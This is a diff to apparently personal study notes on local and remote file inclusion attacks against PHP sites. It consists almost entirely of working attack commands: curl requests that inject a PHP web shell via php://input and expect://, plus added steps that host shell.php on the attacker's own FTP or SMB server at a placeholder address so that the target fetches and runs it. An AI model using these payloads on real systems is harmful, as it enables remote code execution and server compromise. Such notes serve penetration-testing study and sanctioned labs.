@@ -44,4 +44,21 @@ run cmd in url:
     -s silent
   curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
   curl -s -X POST --data '<?php system("id"); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input" | grep uid
-curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
+  curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
+
+
+grep -v      reverse grep
+
+
+RFI:
+  http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php      check RFI vul?
+
+
+Use FTP server:
+  sudo python -m pyftpdlib -p 21
+  curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@<OUR_IP>/shell.php&cmd=id'
+Use SMB server:      better in internal network, as SMB could be restricted from http call
+  impacket-smbserver -smb2support share $(pwd)
+  http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
+
+
